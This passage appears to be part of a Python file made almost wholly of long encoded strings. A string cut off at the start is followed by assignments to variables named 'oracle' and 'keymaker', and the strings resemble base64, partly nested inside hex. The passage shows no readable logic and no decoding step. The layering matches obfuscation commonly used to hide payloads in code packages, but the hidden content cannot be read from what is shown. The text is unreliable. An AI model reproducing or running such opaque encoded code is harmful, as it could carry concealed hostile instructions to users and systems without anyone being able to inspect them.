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'
oracle = 'U1MzZkMmIzNTM3NjY0NjcxMzg0NjczNDg3MjU4NGUzMDU2MzYzMDJmNDY3NzJmMzM0Mzc1Njk0ODU3NWE3MzU4NmE2YTM5MzkyZjc1MzMzMDYzNzkyYjczNGE0YjM3NmQ2NzU1NDk0NTY5Njg0YjMxNDk2MjQyMzE0NjQ2NjkzODQ2NjUzMDdhNzQ3NzUyNTk1NjRiNDg0ZTdhNTQ2MTQ3NGQ2NTU1NmMzOTZkMmI0YTU0MzAyZjMyNzc0NjYyNWE3ODczNDk1ODRkNTMzODc5NmEzMzc1NmY3MDQ3NmQ3OTU2MzU0NTdhNGU3NzZlNGE3OTZhNjkzMTUwNTU0NzQ3Nzg1YTU3NTg3MTRjNTQ3NjUxNjk0NTQ0Mzk0MTY4MzA0NjU3Nzc0YjY3NmU2NjQ2NTc3NDc2NTY2MzQ3NzQ2NDYyNDMzOTZhNzEzNTM2MzAzMTMzNmE3MTYzMzk0MjRhMzU3ODc2NTI0NjU0NjQ2ZDczNmQ1NDRiNzA3MTUyNTk2YzU1Nzk1NDdhNDM1Njc2NDYzMjRiNjI2ODcyNTczMTRlNGI2NjQyNDE3NDMyNTY0YjZiNjE0ODMwNjU3OTMyNmQzMTRlNDkzNDRmNTczODY0MzEzNDYyNjU2YjczNjY1NzQ0Mzc2MjY1NzM2NjU2NTY0ZDRiNTU0NDRkNzU3MDM1MzA0NzY2NDQ1NzJiNGQ2YTc0NzE3NzMwNmU1MjU4NTU0MTZkNzg3MDU5NTM3MzQ0NTc3YTUwNGI1OTQ5NzA2NDY0NjM1YTU3Njg1NjM3NDM0MjMyNTc1ODZjMmI3MTRjNDM3NjUzNDY3NzZkNDczNjQyNjU1MzcwNzM2MjUzNzU0YjU0NGY2NzcwNDc0NDRjNmY3MjUzNTk2YjZmNmY2YzY2NmM0MTUzNzM1OTU3Njk2NDU3Njc3MDcwNzA1NDU1NmY0NTcyNTYzMjZhMzY2MTczNzE3OTc3NmM1NjU3MzU2ZjRlNmY1OTY5NzE2YzMzNmY0ZDRhNmI0NjZkMmY3ODU2NzQ2OTRiNTU2MzM5NzQ1YTZiMzIzOTVhNTQ3MDUzNDE3NzcwNTg1MDZkNTA0YjYxNDE1NzcxNjEzNjZjNmMzMDZjNzM1MzMyNDc0Yjc5NmQ2MjcyNGQ0NjQyNDg1MzQxMzE0ZTc3NTE1NTZiNDM1YTUyNTI1NTRhNmM0NDY4Nzk0OTM3NTk0ZjY3NGM0NjZiMzY2YzZkMzI0MzRjNjg0YzU5NzU0MjRiNTEzMTRkNjk2MzU1NTc0NjRkNTk0NDM1NTE2ODYyNzc0YjU3NmQ0MTQ0NDIzOTZhMzc2NjQ3NGM2NDM3NDM2ODJmMzY1YTZiNjc0ODcxNWEzNjQ3NzA2ODU1Nzk3ODQyNDUzNTM0NjEzODU4NmI3MjYxNDE1NTZjNDkzNTUzMzAzMzQxNWE2YzM0N2E2MjQ1NjIzODdhNmM2MzQyNzk0ZTU0NTczMDU5NzE3MTZlNDE1NTZmNDkzMDc3NmM1MzU1NGE3Nzc5NzA3MDQ2NzM2ZTU3N2E2YjM3NTU0YTczMzk2NjQxNTc0MzRiNjk1ODQ3NjE2ODU2NDc0MTJmMzI3MzQ0NTI1NjY3NjU1YTZlNGQ1MTU1NDM1NzMxNzU2YjRhMzk2MTRjNzc1Njc0NjkzOTUwNzQ0NzU1Nzc0OTczNzA2ZDU5MzI1NDQ2NmMzOTRkNTA1NTRiMzkzMzZlNDE3MzQyNmYzMDY0NTE0NjYyNjc0NTRhNTQ3MDZjNmU2NjczNDM3NDU0NGYzNzQ1NDY2MjZhNGU0NjdhMzI0ZjRiNGI3MjQzNDU3MjUzNjU2ZDRlNzY0MzU3NGIzOTRmNDU0ZDMwMzI3ODQxNGQ1NzYzNzQzODY1NjU1NzM4NTM2NzRhNmU2ZDQ1MzU3NzcwMzA0Mzc1NDE2NTMxNDYzMTczNjM2NDQ5Mzg1MzQ3Mzk2MjU0NTE3Mzc4NTc0MjY1Mzg0YTU5MmI3NDU1NmM0MTUzNTE0NjU4NDgzMTcxNWE2OTJmNDQ0ZjMxNzI1MTQ1NmQ1OTU4NzM1ODU2NGQzMDUyNTczNTc0NzE1OTcxNzE0Nzc3NTY3NDQ1NTQ0NzZiNDY3ODUyNGE1NTUxMzkzNjM2Nzg1NjYyMzg3NzUwNjI0NzU2NzY3NTQ1NGM1NzMzNDU0NTZkNzk1NjU5NTU3MzRmNTcyYjM3NTk0NDczNGUzMzU5NDE0YzMzNGI1NjQzMzk0YTZiMzM3ODU5MmY3NDZhNzkzNTYyNmI0MTc0NTU0ZDMxNDI1Nzc5NGEzMTRmNmE3MzU5NTU2NTU3NTU3OTM1NjI2MjQzMzE2ODY2NjY2OTc2NmY3NzcwNDM3Mjc4NDY1ODMyNDU0YzQ3NjQ1MTdhNzA3NjcwNTk0ZTQ5MzY2ZDMzNmQ0MTcyNjk3YTQ1NDQ3NTY3NmU3NzY5NzEzMTZhNDg0MTZiNTE2ZDcyNGI0NjcyNTY3MjQ1NzE3ODUyNjI2NTMwNzc0Njc0NjM2OTY2NGM2Yjc4MzE1YTM3Nzk1NzZkNzM3MTUwNGM1NzM1NzM3NzU3NDc0YzZjMzY2YzM2NWEzNDUwNDgzOTU4NGI0ZTQyMzAzODc5NWE1OTMyMzM3MTQ1NDY2NDUzNGEzODU1NGEzNjYxMmI1YTJiNTQ3NjZmNGU3OTQxMzg3MzYyMzY0ODMwNDYzMTU5Njk2ZjMzNzE0NTYzNGY3MTQ2NzY1OTMyNmQ1NjcxNGY3NDM2NGM0YzU4NmM1MTM4NDU0ODMxNTE0Zjc3NjI2NzQ1MzM2NTM2NzY2NDY3NTIzMTQyMzE1MTRiMzI2ZTM4NjY2MTY3NDc2YjY1Nzc2ZDM2NDczMzRiNDI0ODUwNTE0MTU4NmQzNzY2NTY0YTU1MzQ2Mzc3NTAzNDM2MzEzOTQ0MzU1MTM4NDU0NTRlNDE0NzU3NTAzODU1NzY3YTY2NjQ0YTU3Njc1NjczNzY0MTc2Mzc2NzZhMzY0NDUxNTY0YzdhNGU3YTU2NzU1OTZmNGM1YTZhNzE3ODc4NTU0NDU4NzI2NjQ4NzI2ODQxNmU0MTRhMzE0MjQ0Njc0NjQyNTE2NzMwNTc0Nzc4NmM3NzZjMzk2NDcwNzA2MTQyMzM3MTQyNDE0YzY0NzUzNzY1Njk3NTVhMmY1Mjc4NjIzNDM1NzE0MzcxNTM2ZTZmNTQyYjcwNGM3ODVhNTM0ODUzNjM2NTY0NGQyZjc4NzI3ODcyNTI1NjcwNzA2MjU1NjU2ZDc1MzEzNDY5MzM0ZjRmNjI2MjM2NjU1OTc1NTk2YTc3NTM0MTQ1NzM1NTM0NDE0ZDU1NTM1NjQyNzEzODYyMzk0OTU1NmY0NDUwNzA1NTU2NGUzNTY1NGI3NTMzNDE2NTM3Nzc2NTM0NTQzNDMyNTk0MjRiNmY1NTQyNzgzODU4Njk3MjZlNzUzMzQ3NmM0NTM4NDg1NjQ1MzY2ZDU4Njg3MDM4NGE0OTQ3MzM3Mjc1NmMzOTU2NDk1NDZkNmY0NjY3Nzg3MDUyMzU0ODUxNjg0NDJmNTE2MzU2NDE1NDQ4MzE1MzU1NWE2YzY5MzQ0ZjcxMzgzNDY2NDI1NzJiNzc2ODJmMzM0NDQ5NTY2YzM2NmU3YTQ5Mzc2MTc5MmI1NDZkNDg0YjY0NzU0OTQyMzY0MzU3NTY0YTQyMzMzODM5NTE1ODc4NTEzNjRiNDYzNDZhNmE1NDQ0NmM0MjZlNDE2NjZjMzA0NzYxNGI0NjMxNTA0MTQ2NDY0ZjdhMzk0Yzc4NzIyYjMzNmI1NTQxNDI1MzJiNzU1OTM1NDQ0NjQ1Mzg2MzM5NjE1MTZkNDE0NjYzNmM1NTMzNzMzMDUwNTI0NjYyMzY2MTQzNDE2NzRhMzY0MTcyNTg2MTZkNjQ0OTMyNjM1MDc5NjE2ZDM0NzU3MTc0NTg2ZjY2NmU3ODU2NTM0ODM1MzE2MTM1NzA3MDM4Nzc2ODU0NmI3YTM5NDY0NTU5NzA2ODY5NTM0ODRiNDMzODY3NjU0YjRkNGY2ZjQ3NzA1ODUxMmI0ZjMxMzg2ODU4NDY1NjRmNjY3MjQzNjMzMTc4NjQ0YTM1NDMzMTU0MzU2ZTUwNGY1NTcwNzQ0MjQ4NDg0MTJiNTkzMjZjMmI0MjMwNzA2YTcwNTk3Nzc5NjMzOTMzNGE0ZTY4NTg2NDQxNmI1MTUzNTY0ZTM5NGEzMDQ2NzczOTc4NDIzMTc2NjM0YTY1NmY0YzM2NDI0ODJiNzc0ODUyNGY3ODU1NjQ2ZDUxNDY2YzQ4NTA0ZDRhNTc1MDcxNjk2YTZiNjE2MjQ0Njc2YzRiNDY3NTRkNTI1NTRkMzI0MjU4NjE0ODc4MzU2ZDYxNjE1MzRmNzMzOTZhNDM0YjQzNzk2NzRkNzI2ODYzNGUzMTY4NTA3OTZkNzA2ODcxNjE2YjYxMzA3MTRiNzA2YTYxNDE2YjY3NTEzNjQ2NjgzODQyNmQ3MDY4NGI3YTUwNDU0NjY0NzQ1MDYyMzk2Yjc5NzQ2NzU2MzU3Nzc4NDk0YTcwNDI1NTc5Mzk1MTZjMzU0MzY2NDQ1NzVhNTM2YTc3Nzg1YTU5NmU2YTcyNzU0YjM2NGEzMzZmNjUzOTUxNDM2NTc5NjEzNTRkMzI1OTYxMzg2ZjRkNjE0MjcxNmUyZjU3NjU2NDY2NGE2NjczNTU0ODcwNjgzNDdhNjQ1MjU2MzQ1MzcxNDU1ODU1NGY3MDcxNTU0YTM5NmU1NDQ4NmI0NTM1NTU2ODU0Mzg0YTZjMzY3MjZjNGEzOTM1NDU1MjRlNjY0NDUxNDM2YzUwNzc2MTM4NTQ1NjUwNGU1OTMyNDQzNDM3MzM0ODMxNDQ3MjQzNTkzNDZkMzQ0MTM0NmY3MTJmNGI2NDZkMzY2ODYzNjY1NDMyNDM0Yjc0MzY2YjcwNDE3NTU4NzM1MzYzNmI3ODU1NTI2NDc0NDk1YTYzNDQ3MTcwNDkyYjQ5NzM0ZTU1NjQzNjU5MzIzNjUzNGQ0YzZkMzEyYjU1NGI0NjQ0NzkyYjQ3Njc0NTcxNDY2Zjc1NTUzNTc5NDI2NDM2NjEyYjU0NDI3YTQ4NmQ2MjcxNzQ2ZDUwNGEzMjM1NmQ0ZTVhNzc0OTRmNzU0NTVhNmM1MzQzNGQ3MTU5Nzc1ODU2NDM2OTc2Njc0MjMzNGM0NTY2NjE2MTZmNmY0YjQ2NTU2NTRiNGIyYjZiNGM3OTJmNTMzMTQzNGE3NDRlMzg1Mjc4NmIzNDJiNDM3MDY2NDE2YTU1NGY2YzQxNzI2MzQ1NTI0NjQ2NDI1NTZkNGE1YTc0NjMzNTc3NDE2NDUyNzA1NTU5NGQ2ZjYyNTg0YzY0NzczMzQ1NDYzODZjNjE2MTc1NTYzOTc4NmU2YTUxNjY3MTQ4NTM2YTY4NDc1MjJiNDI1NTcyNDE2ZTM1NzA3MTQzNjc2ZjM1MzY2ODUwNGQ3OTRiNDI2ODZiNDgzMTQxNGI2NzU0NzY0NTUxNjQ2OTYyNzM1MTY0MmY3NzMxNDU2ZjU0NTM0NjZlNDc2YzcyNTI3MzQyMzU1MTZlMzM2OTZmNmQzNTQ3NTg3NTYzMzY2MzZmNjQzNDczNTE0YzY0NDI3NjYxNGI3MDc3MzU2MTZkMzA3MDY0MzY2NjQ0MzczNjQyNjM2ZjUyNjM0MTc1Mzg1MjQxNjI2MjcyMmI0NTZhNGM0MzYyNzc3YTM1NTE1YTY4Nzk2ZTMxNjg3MTVhNDE2YjY0MzgzMTcyNzE1OTY5NTYzNjQxNjU0OTc3NTk3MTMxNDE2NjQxNmE2ZjM0NjY3OTUwNGY2MTQ1NzMzMDU1NGM3YTM3NTM2ODQ4NmE0NjUyMzU3NzRiNTQ2MjZjNmI3MTY4NTc2ZjM1NzE2YTMzNGY0YTM0NGQzODRjMzg0ZTRiNDkzMjY3NDE2ZjQ2NjkzMTY5NDI2NjY3NzU0YTUzNTc2YjM5NGI1MDZjNGYzMjM0NWEzODM1MzY3NDYzNTUyYjQ5NDU2NTU1NGE2MzdhMzU2NDc4Njk2MTY4NTI1NDcwMzQ0ODY0NzMzNjYxNjM2MzJmNzg2NzcxNjk2NzY2NzM1NTRhMzk2YzM4NGY3NTczNDI3NjZiNWE2YzJmNDg2MzMyNjQzOTM5NDU0NjU0Mzc1MzdhNDM3MTM2NTk0NzRkNmEzNDM0NTI2NzRkNTA0OTMzNDM3NTRiNTY0NzUyNzA3NDRhMzQ1ODQ1MmI0NDU5NzE3MDc4Nzg3NjRjNDU2YTU5MzYzNzU4NGI2NDZmNDM2ZDc2NGI0NjQ1NDI1MTYzMzM0MjZiNTk3MTM0NzA2MzQ0NDU2Njc5NTc1MDRiNDg0ZjRhNTU3ODUyNTIyZjM5NDU2ZDQ3NzA2ZTM3NTIyYjRhNjE3MjZhMzk0NDcwNzY0MTRmNzE3MDQ5MzQ0YzQ0NTM2OTc1NzU3MTM3NmI1OTc5MzQzNDQ1NzU1Nzc3NjY1NTdhMzk2ZDVhNzQ1MDc2MzA0ZjM5MmIzNjc3NTQ1OTM2NTk0ZjYyMmY2ODQ5NTg3NjUzNmI2YTQ0NDg1NjM3NjI0ODY4MzM0NTdhN2E2MjU0NGEzOTM1NDE0MjM1NjI0ODZmNjU1OTMzNmU0NzZjNWE3YTM3NzEzMDY4NTQ3MTU2NmI2ZTY2NDI3NzRlMmY1MTU4Njk2ZDM4NDU1NTc5MzA3MDU0NTg3NjZjNDk0ODcyMzg3NjRkNzI2ODY1NzEzMDQzNjg2ODMxMzc2NzQzMzM3ODQ1NmEyZjc1NGIzNTM5NDc0NzY5NjU3MzczMzQ0NjQ1NjY0OTU3NDM0YjQ2NjU0ZDZmNTI1Njc5NDc1ODc5NGU2NjVhNjg3ODZlNGY0MzM5NjE3YTMzNmE3ODRiMzQyYjZhNmM3MTMyNTkyYjZkNTI3ODc2NDE1MzQ2NjkyYjRmNTQzMDc2NTA0MjQ1NTE2MTM4NmUyZjMwNTUyYjUxNGM2YTczNmU3OTY3Mzg3MDcxNGQ2ZDJmNTQ1ODZiNTI2NjMwNTQ3YTZhNjk2ZjRjNjg2NTQxNjE1NzU5NGI1NzY2NjM1NDJiNDM2ZjQ3NzU0ODRiNTE2YzM1NDQzMzRmNDQzNjZjNjE2ZTY5NDI2NjUzNzUyYjM0NjU0YTZhNzk3ODc3NTg2YjYxNjU3NzQyNDU2OTc0NzE3NjQ2Mzg1OTdhMzk2YTZmMzg3NzM0NzU2NzRlNzE0NzRmNmY3MDU0NTI1NjQ4MmY2YzJmNzk3NjU1NTI0NDRhMzU1MDcyNjY3MzQyNzA3MjYyNzA2ZjdhNGI2ZjRiMzUzNTQ4NjM0Mzc5NGY3MTMxN2E1ODZmNzIzNDQ2NTA1Mjc4Mzk0OTc1NGEzNzc5NTY1MTc0Mzk2Yzc2NmI0ZTU5NzU1MDcwNGY2ZjM0Mzc0NDQxNmM0NzUwNTg2Yjc3NGM2ODUwMzk1MjQ2NTYyZjY1MzU0OTQ4NzkyZjY5NmYzNTQ2NGQ2MjUxNGU2NTRjNjQ1NDcyMzM0MzM5MzU2YjYxNjI2OTRlMzc0MzdhMzk3MzM4NDM2NjU1NTA0NDZjNDU2NTZkNDg0ZjRlNmY3OTJmNGY1OTc4N2E1MDJmNjM2NDM3NTUzOTcxNjQzNjYyMmY3NTZiMzU0NzcyNjE0ZTU5MzQ1NTUxNjEyYjY3NmU2ZDU2NGQ0YjU3NjU3MTYzMzg0ZTM5NzA0ZDZjNTU0ZTU2MzE2NjU0NWE3ODQ4NGI1MjM5NzgzMzUwNTQzNDJiNDE0NjU0MzM3ODQ3NzY3NTQ0MzU0NzQ4Mzg2ZTQ4MzYzMTQ0NjI0OTM4Mzc1MTZlNGM3NzRkMmI1MjM3Mzk3NDU0Mzc0MzU3NDU2YzY0NmUyYjRlNDk0MjRlNzM1NjQ2NGU2NDczMzE0NTY2NDg0YjQ1MzQzMTc3NDE1ODY5NGU0ZTM2NDgyZjcwNTc1MDJmNGY0ODZmNDM2NTUzNjEzNjYyMzY0YTM2Nzg1NzU0MmIzMzU4NTUzMjMxNzAyZjRhNmM1MDJmMmI0YjY5NDczOTc0NjU2MzZhMzQzNjU2N2EyZjU1NDczMTcyNGY3MDZhMzM3YTZjNTc0MzY2NDE1NTY0NmM0YTQ4MzYzMzY4NDkzNTU2NTk1YTMwNDUyYjY1Mzk2MTU2NmI1NDM1NzEzMDY2NDM1MjMxNWE0NjdhNDY3NTRmNTIzNDJmNjE1NjM4NTE3MzYzMzg3NDQ1NjQ2NjRkNjQzNjQyMmI3MDQ5NzI3MDRkNzM2NjYzNTE0YTM4NmQ1OTYzNDIyZjUzNTI0OTRkMzU0YzQ2NzM2NDY3NzY0NTYzNjY1NTY0NGU0ODM1N2E3NzJiNTA2ZjU5Mzg2ZjY2MzEzMTY1NzQ2MTYyNmY0YzY0Nzk1MDcwNTU1NDcxNGI2ODM4NTY0OTc1NTA2NTcyNzIzNjcxNDE2NTZmMzU2MzM0NzY3OTZkNjY0NTM3MzgzOTQyNDQ1ODY1MzQ3MjcxMzg1NTM2MzU0ZTc4NjI0ZjcyMzE0NzZmNDUzNjcwNjQ2MTMxNzc1MDUwNDk0OTJmNTQ0NDYzNWE0MzUwNDE0YzRlMmIzOTU0NmY1MjRiNGY2YTY5MzE3ODQ1NjYzOTRiNjQzNDY4Mzc1ODZjMzk1MTMyNGY1MTc3NTk2NjRkNTU0MjY0NTg2NjQ2NTI3NjM1NmQ2ZDRlNGI0OTJmNTE2Njc4NDY3NjYzNzA1NTM3NDU0NTY2NjU1NTQxNjU1OTYxNzA3NDcwNTc2ZTZjNzE0YzY1NTk1Nzc2NzI1MTM2Nzg1YTJmNTU3MDQ2NmU2ZDczNGI0ZjQ3NDM2NjMxMzA2MTUzNGE2YTMwNTEyYjM5NDI0NjUwNTA2YjYxNDQyZjQ0NGQ2OTQ4NmQ1MDY0NjcyYjc0NzQ2YTZiNjY3NzQ2Mzg1MTc4NzI0OTY2Nzc0NTU1MmI0NDJiMmY0YzMwNmQ2MjM4NjQ1NTRiNGE0MjMzNTkyZjczNzAzMzM5NGU0ZjQ5NzI0NzJmNTQ3MTc2NTY3OTQ2NzY3NzUyNjI2ZjQ5MzA0MzVhNDI3NDU1NjM1MjMxNGY0NTcwNzM3NzM2N2EzMzdhNjc0ZDYyNTc2MTRiNjQ2YzU1MzEzOTU1MzYzMzJmMzM0YjcxMmI2YTU0NjU0MjMzNGMyYjcyNGY0ZjUzMzc2ZDc1NzEyZjZlNmY0YzU5Mzc1MzM4NmM0NTUyNzI3NDRlNzg0YTUwNmU0MzRmNGU0NTM0MzU2MjY5NjczODc5NTQzNjMxNzY3Mjc2Mzk2YjMyNTY1ODY5NjY2ODY2NzE0NjQ1NTA0ZTU4NTU2NTczMzc0YzU4NGI2NjRmNGU2NDU1NTU2NDY0NzA1YTM5MzkzMTRkNTI2NTU4MzY0NDQ4NTg2ZDc3NGM2YTU1NjQ'
keymaker = '2ZGDmAmD2LGZmAwx0LGZ1Zmx0AmZ4ATRmAGH1AGtmBGHkATH3ZGD4AzL3AGpjAmp1ZQMzAzL0AmZ5AwHmBGEzATD0LwD0ZzV3AGH4Zmt2LmDkAmD0BQH1ATH0BQp2AzH1ZQH3AGV1AmpmAGV3AQD4AmL2AQpmAwZ0Awp4AQt1ZQZ4ATZmBGDlAwtmBQDlAQp3ZQMxAGZ2BGZmZmD0AmHlZmR2LGZ0AGZ0ZwZ3ZmN1AGHjAQxmBQp1AwVmAwD4ZzLmZGH3ZzL2LGMvZmp3LGH1AwZ2LmpjAzL3BGMyATHmBQDkAmH3ZmH5ZzV2AmZ2AwxlLwEyAwH3BQD1AwHmAQWvATD2AmEwAzR2Mwp3ZmL2MQLkAGx3ZmLmZmplLwHjAmH3AGDlZmHmZGD5AwH1ZQMwATL1AQZ2AGZ0MwH0AQHmAQZmAQV2AwpjAmD2ZmZ5AmZ0BQZ2AQL0BGp3AGL0MQMyAGpmAwHkAQtlMwHlAGV3AGp3AwtmZGD3ZmZ1AQD2AwH1ZGpjAmt0ZGZ1AGV3ZQpjAmL1Zwp5AzH1BGMwAGx0AQEzA2R2BGEvAQD1ZQH3AQR1ZwD1ZzLmZQH1AwD2BGquAGR1ZQZ1AGRmAGMzZmL2LGp0ATH2MGD2AwLlMwp4ZzVmZwWzZmR2ZGH3Amx0MwZ5AwH2LwD0AwRmAmMwZmZmAGpkAQxmZGZ2AwxmAmDkATL1ZGH3AGt3ZwDkAzD3AQpjAwH2AwHjATH2AGLmATHmZmD2AmL3AmH4ATD0BQMuZmV2MwDlATZ0ZmHjZmH2ZwpmAmp1ZwD4ZmpmBQD3ZzL1BQZmAzD2AQMyAQD2LmMyATD2ZwL4AmD0MGH4AGN1AGpmAQR2ZwEyAmL0LmMvAGR2ZGZ5AQD2AmH0AQx0LwplAQZ1ZmZ1AmN0AQH2ZmH3ZwDmAQRmAQL5ZmtmBGEyAzL3AwDkAwL2AGZ0ZmR2AQH5AQD3BGZ4ZmN0LGWvZmL3ZGp3ATD2MQL0Amp0BGH1AQH3ZwZ4Amx2MGZ5ZzL3ZQH4ZmN2AGp5AmZ2LwD0AzD2ZwMyZmH3ZQquZmL3AmZkAGN3AwpkATH3AwZ2A2R1BQZ4AzD0AmH1AQt3BQZmATD0LGL1AwL1ZGZ2ZzVlMwH3ZmH2BQMxZmp3BGD3AmL2ZmMuAzH0Mwp2AzHmBQH0AzD1BGHlAGR1ZwEzAmN0AmExAQx0LmZ3Amx0ZmpkZmD3AwplZmD3